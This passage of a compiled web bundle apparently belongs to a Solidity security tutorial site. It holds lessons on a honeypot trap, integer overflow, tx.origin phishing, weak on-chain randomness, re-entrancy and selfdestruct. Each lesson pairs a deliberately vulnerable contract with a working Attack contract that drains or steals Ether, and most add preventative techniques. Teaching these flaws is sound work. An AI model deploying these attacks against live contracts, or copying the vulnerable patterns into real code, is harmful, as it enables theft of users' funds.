class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;\n        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>,<span class="hljs-string">"Deposit"</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(_amount &lt;= balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Insufficient funds"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n\n        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= _amount;\n\n        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _amount, <span class="hljs-string">"Withdraw"</span>);\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Logger</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> caller, <span class="hljs-keyword">uint</span> amount, <span class="hljs-keyword">string</span> action</span>)</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _caller, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(_caller, _amount, _action);\n    }\n}\n\n<span class="hljs-comment">// Hacker tries to drain the Ethers stored in Bank by reentrancy.</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    Bank bank;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Bank _bank</span>) </span>{\n        bank = Bank(_bank);\n    }\n\n    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {\n        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(bank).<span class="hljs-built_in">balance</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {\n            bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);\n        }\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        bank.deposit{<span class="hljs-built_in">value:</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();\n        bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n    }\n}\n\n<span class="hljs-comment">// Let&#x27;s say this code is in a separate file so that others cannot read it.</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HoneyPot</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _caller, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n    </span>{\n        <span class="hljs-keyword">if</span> (equal(_action, <span class="hljs-string">"Withdraw"</span>)) {\n            <span class="hljs-built_in">revert</span>(<span class="hljs-string">"It&#x27;s a trap"</span>);\n        }\n    }\n\n    <span class="hljs-comment">// Function to compare strings using keccak256</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">equal</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _a, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _b</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)\n    </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_a)) == <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_b));\n    }\n}\n</code></pre>\n'})};var ss=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Arithmetic Overflow and Underflow",description:"An example of hacking Solidity with arithmetic overflow / underflow",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Integers in Solidity overflow / underflow without any errors.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">// This contract is designed to act as a time vault.</span>\n<span class="hljs-comment">// User can deposit into this contract but cannot withdraw for atleast a week.</span>\n<span class="hljs-comment">// User can also extend the wait time beyond the 1 week waiting period.</span>\n\n<span class="hljs-comment">/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TimeLock</span> </span>{\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> lockTime;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;\n        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> + <span class="hljs-number">1</span> <span class="hljs-literal">weeks</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increaseLockTime</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _secondsToIncrease</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += _secondsToIncrease;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt; <span class="hljs-number">0</span>, <span class="hljs-string">"Insufficient funds"</span>);\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> &gt; lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Lock time not expired"</span>);\n\n        <span class="hljs-keyword">uint</span> amount = balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];\n        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;\n\n        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    TimeLock timeLock;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">TimeLock _timeLock</span>) </span>{\n        timeLock = TimeLock(_timeLock);\n    }\n\n    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {}\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        timeLock.deposit{<span class="hljs-built_in">value:</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}();\n        <span class="hljs-comment">/*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        */</span>\n        timeLock.increaseLockTime(\n            <span class="hljs-built_in">type</span>(<span class="hljs-keyword">uint</span>).<span class="hljs-built_in">max</span> - timeLock.lockTime(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))\n        );\n        timeLock.withdraw();\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Use <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol" target="__blank">SafeMath</a> to will prevent arithmetic overflow and underflow</li>\n</ul>\n'})};var as=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Phishing with tx.origin",description:"An example of phishing with tx.origin in Solidity",html:'<h3 id="whats-the-difference-between-msgsender-and-txorigin">What&#39;s the difference between <code>msg.sender</code> and <code>tx.origin</code>?</h3>\n<p>If contract A calls B, and B calls C, in C <code>msg.sender</code> is B and <code>tx.origin</code> is A.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>A malicious contract can deceive the owner of a contract into calling a\nfunction that only the owner should be able to call.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let&#x27;s see how we can hack this contract\n*/</span>\n\n<span class="hljs-comment">/*\n1. Alice deploys Wallet with 10 Ether\n2. Eve deploys Attack with the address of Alice&#x27;s Wallet contract.\n3. Eve tricks Alice to call Attack.attack()\n4. Eve successfully stole Ether from Alice&#x27;s wallet\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice&#x27;s wallet to Eve&#x27;s address.\nSince tx.origin in Wallet.transfer() is equal to Alice&#x27;s address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Wallet</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title"><span class="hljs-built_in">transfer</span></span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">tx</span>.<span class="hljs-built_in">origin</span> == owner, <span class="hljs-string">"Not owner"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> _amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> <span class="hljs-keyword">public</span> owner;\n    Wallet wallet;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Wallet _wallet</span>) </span>{\n        wallet = Wallet(_wallet);\n        owner = <span class="hljs-keyword">payable</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        wallet.<span class="hljs-built_in">transfer</span>(owner, <span class="hljs-keyword">address</span>(wallet).<span class="hljs-built_in">balance</span>);\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>Use <code>msg.sender</code> instead of <code>tx.origin</code></p>\n<pre><code class="language-solidity">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title"><span class="hljs-built_in">transfer</span></span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == owner, <span class="hljs-string">"Not owner"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = _to.<span class="hljs-built_in">call</span>.<span class="hljs-built_in">value</span>(_amount)(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }</code></pre>\n'})};var ns=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Source of Randomness",description:"Blockchain is not a reliable source of randomness in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>blockhash</code> and <code>block.timestamp</code> are not reliable sources for randomness.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\n<span class="hljs-doctag">NOTE:</span> cannot use blockhash in Remix so use ganache-cli\n\nnpm i -g ganache-cli\nganache-cli\nIn remix switch environment to Web3 provider\n*/</span>\n\n<span class="hljs-comment">/*\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let&#x27;s see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">GuessTheRandomNumber</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">guess</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _guess</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">uint</span> answer = <span class="hljs-keyword">uint</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(\n            <span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> - <span class="hljs-number">1</span>),\n            <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>\n        )));\n\n        <span class="hljs-keyword">if</span> (_guess == answer) {\n            (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}(<span class="hljs-string">""</span>);\n            <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n        }\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    <span class="hljs-keyword">receive</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {}\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params">GuessTheRandomNumber guessTheRandomNumber</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n         <span class="hljs-keyword">uint</span> answer = <span class="hljs-keyword">uint</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(\n            <span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> - <span class="hljs-number">1</span>),\n            <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>\n        )));\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    <span class="hljs-comment">// Helper function to check balance</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t use <code>blockhash</code> and <code>block.timestamp</code> as source of randomness</li>\n</ul>\n'})};var ls=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Re-Entrancy",description:"An example of re-entrancy attack in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Let&#39;s say that contract <code>A</code> calls contract <code>B</code>.</p>\n<p>Reentracy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nEtherStore is a contract where you can deposit any amount and withdraw at most\n1 Ether per week. This contract is vulnerable to re-entrancy attack.\nLet&#x27;s see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherStore</span> </span>{\n    <span class="hljs-comment">// Withdrawal limit = 1 ether / week</span>\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">constant</span> <span class="hljs-keyword">public</span> WITHDRAWAL_LIMIT = <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>;\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> lastWithdrawTime;\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt;= _amount);\n        <span class="hljs-built_in">require</span>(_amount &lt;= WITHDRAWAL_LIMIT);\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> &gt;= lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] + <span class="hljs-number">1</span> <span class="hljs-literal">weeks</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n\n        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= _amount;\n        lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>;\n    }\n\n    <span class="hljs-comment">// Helper function to check the balance of this contract</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    EtherStore <span class="hljs-keyword">public</span> etherStore;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _etherStoreAddress</span>) </span>{\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    <span class="hljs-comment">// Fallback is called when EtherStore sends Ether to this contract.</span>\n    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {\n        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {\n            etherStore.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);\n        }\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);\n        etherStore.deposit{<span class="hljs-built_in">value:</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();\n        etherStore.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);\n    }\n\n    <span class="hljs-comment">// Helper function to check the balance of this contract</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Ensure all state changes happen before calling external contracts</li>\n<li>Use function modifiers that prevent re-entrancy</li>\n</ul>\n<p>Here is a example of a re-entracy guard</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ReEntrancyGuard</span> </span>{\n    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">internal</span> locked;\n\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">noReentrant</span>(<span class="hljs-params"></span>) </span>{\n        <span class="hljs-built_in">require</span>(!locked, <span class="hljs-string">"No re-entrancy"</span>);\n        locked = <span class="hljs-literal">true</span>;\n        <span class="hljs-keyword">_</span>;\n        locked = <span class="hljs-literal">false</span>;\n    }\n}</code></pre>\n'})};var es=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Self Destruct",description:"An example of how to delete your smart contract by calling seldestruct in Solidity",html:'<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>\n<p><code>selfdestruct</code> sends all remaining Ether stored in the contract to an\ndesignated address.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>A malicious contract can use <code>selfdestruct</code> to\nforce send Ether to any contract.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">// The goal of this game is to be the 7th player to deposit 1 Ether.</span>\n<span class="hljs-comment">// Players can deposit only 1 Ether at a time.</span>\n<span class="hljs-comment">// Winner will be able to withdraw all Ether.</span>\n\n<span class="hljs-comment">/*\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game\n   No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> targetAmount = <span class="hljs-number">7</span> <span class="hljs-literal">ether</span>;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> == <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);\n\n        <span class="hljs-keyword">uint</span> balance = <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n        <span class="hljs-built_in">require</span>(balance &lt;= targetAmount, <span class="hljs-string">"Game is over"</span>);\n\n        <span class="hljs-keyword">if</span> (balance == targetAmount) {\n            winner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n        }\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == winner, <span class="hljs-string">"Not winner"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span 